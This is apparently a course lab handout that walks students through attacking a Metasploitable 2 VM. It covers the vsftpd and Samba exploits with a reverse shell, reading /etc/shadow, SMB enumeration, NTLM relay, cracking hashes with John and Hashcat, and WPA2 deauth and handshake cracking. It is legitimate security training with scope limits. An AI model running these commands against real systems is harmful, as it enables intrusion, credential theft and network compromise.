Part 0 — Setup

Goal: both VMs up on one host-only network, and you know each machine's address.
Do this
ip a                 # on Kali: note your address, e.g. 192.168.56.101
# find the Metasploitable host on the same /24:
nmap -sn 192.168.56.0/24     # or use the address you recorded in Week 3
What you should see
192.168.56.102  (Metasploitable 2 = acme-legacy)
What it means
You now have the attacker IP (Kali) and the target IP (acme-legacy). Substitute <ms2-ip> and <kali-ip> throughout. No VM? Read lab-assets/sample-output/ transcripts as the fallback.

Part A — Metasploit on acme-legacy

Do together after Section 1 (Exploitation & Metasploit)
Goal: open a root shell, capture proof of access, and copy the password hashes for Part C.

A1 — vsftpd 2.3.4 backdoor (CVE-2011-2523)

Do this (exact commands)
msfconsole -q
workspace -a acme
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS <ms2-ip>
run
What each part means
workspace -a acme files everything under the Acme engagement. search finds the module; use loads it; show options lists required fields; set RHOSTS is the target; run fires it. This module needs no payload — the backdoor opens its own shell on TCP 6200.
What you should see
[+] UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened
What it means
You have a root shell on acme-legacy. In the session run id, hostname, uname -a and take a timestamped screenshot — that is your proof of access.
Checkpoint: session opened, id shows uid=0(root). Full transcript: lab-assets/sample-output/vsftpd-exploit.txt.

A2 — Samba usermap_script (CVE-2007-2447)

Do this (exact commands)
use exploit/multi/samba/usermap_script
set RHOSTS <ms2-ip>
set PAYLOAD cmd/unix/reverse
set LHOST <kali-ip>
run
What each part means
A different vulnerability, same six-beat flow. This one wants a payload: cmd/unix/reverse makes the target call back, and LHOST tells it where (your Kali). Reverse is the safe default because outbound traffic escapes firewalls.
What you should see
[*] Command shell session 2 opened
id -> uid=0(root) gid=0(root)
Then: capture the hashes for Part C
cat /etc/shadow        # copy the lines to shadow.txt on Kali
Two different findings both become root. Copy the shadow lines now — they are the bridge to the cracking part.
Checkpoint: second session open; shadow hashes saved. See lab-assets/sample-output/samba-exploit.txt. No VM? use lab-assets/shadow.txt as the fallback.
Restraint: get in, prove it, copy the hashes, get out. No deleting data, no new accounts, no persistence, no out-of-scope hosts.

Part B — Network attacks

Do together after Section 2 (Network attacks)
Goal: enumerate SMB on acme-legacy (live) and understand the relay toolchain (narrated).

B1 — SMB enumeration (live)

Do this (exact commands)
use auxiliary/scanner/smb/smb_version
set RHOSTS <ms2-ip>
run
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS <ms2-ip>
run
What each part means
auxiliary modules gather information with no payload. smb_version fingerprints the service; smb_enumshares lists shared folders. Look at the signatures: field — optional means SMB signing is not enforced.
What you should see
[+] Host is running Samba 3.0.20-Debian (Unix)  (signatures:optional)
[+] tmp - (DISK) oh noes!
What it means
You know the version (an attack-surface fact) and the shares (possible loot), and that signing is off (a relay target on a Windows network).
Checkpoint: you can read the Samba version and share list. See lab-assets/sample-output/smb-version.txt and lab-assets/sample-output/smb-enumshares.txt.

B2 — Relay toolchain (narrated; needs a Windows victim)

Do this (read / narrate)
responder -I eth0                              # lure victims to authenticate to us
ntlmrelayx.py -t smb://<no-signing-server> -smb2support   # forward that auth
What it means
Responder answers leaked name-resolution requests; ntlmrelayx forwards a captured Windows login to a server that lacks SMB signing — you act as the victim without the password. Metasploitable has no Windows client, so we run this for real in the Windows lab later.
Checkpoint sentence: SMB signing stamps each message, so a relayed auth looks tampered and is rejected. See lab-assets/sample-output/responder-ntlmrelayx.txt.

Part C — Crack the captured hashes

Do together after Section 3 (Password attacks)
Goal: crack the md5crypt hashes you captured, first with John, then with Hashcat.

C1 — John the Ripper (auto-detect)

Do this (exact commands)
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
john --show shadow.txt
What each part means
John reads shadow.txt, auto-detects the md5crypt ($1$) format, and tries each word in rockyou. --show prints what it has cracked. If rockyou is gzipped: gunzip /usr/share/wordlists/rockyou.txt.gz once.
What you should see
msfadmin (msfadmin)
postgres (postgres)
...

C2 — Hashcat (mode 500)

Do this (exact commands)
hashcat -m 500 -a 0 shadow.txt /usr/share/wordlists/rockyou.txt
hashcat -m 500 shadow.txt --show
What each part means
-m 500 = md5crypt (you read the $1$ prefix to know that); -a 0 = straight dictionary attack; then the hash file and the wordlist. Hashcat needs the mode number; John figured it out for you.
What it means
Every cracked password here is a dictionary word or default — they fall in seconds. A long random password would survive, which is exactly the recommendation for Acme.
Checkpoint: at least one real hash cracked; you can name the format (md5crypt, $1$) and the Hashcat mode (500). (Full answers in the instructor solutions.) No VM? crack the provided lab-assets/shadow.txt.

Part D — Crack a WPA2 handshake

Do together after Section 4 (Wireless attacks)
Goal: identify a WPA2 4-way handshake and recover the Wi-Fi password offline with Hashcat mode 22000.

D1 — (optional) capture your own

Do this (needs a monitor-mode adapter)
airmon-ng start wlan0
airodump-ng --bssid <ap-mac> -c <chan> -w cap wlan0mon
aireplay-ng --deauth 5 -a <ap-mac> wlan0mon   # force a reconnect -> handshake
No adapter? Skip to D2 and use the provided capture — the cracking step is the part that teaches the concept.

D2 — Convert and crack (everyone)

Do this (exact commands)
# convert the raw capture (needs hcxtools):
hcxpcapngtool -o wifi.hc22000 lab-assets/wpa2-handshake.cap
# OR use the pre-converted hash that ships in the zip:
hashcat -m 22000 -a 0 lab-assets/wpa2.hc22000 lab-assets/wifi-wordlist.txt
hashcat -m 22000 lab-assets/wpa2.hc22000 --show
What each part means
hcxpcapngtool extracts the handshake into the modern hash format. -m 22000 is WPA/WPA2 (handshake and PMKID). The capture's SSID is AcmeStore. wpa2.hc22000 is provided pre-converted so the crack works even without hcxtools.
What you should see
...:AcmeStore:AcmeStore2023
What it means
You recovered the Wi-Fi password offline from a captured handshake. The key fell only because it is weak; a 20+ character random key would never fall to a wordlist.
Checkpoint: recovered AcmeStore2023; mode is 22000; a long random key would defeat you. (Full answers in the instructor solutions.)
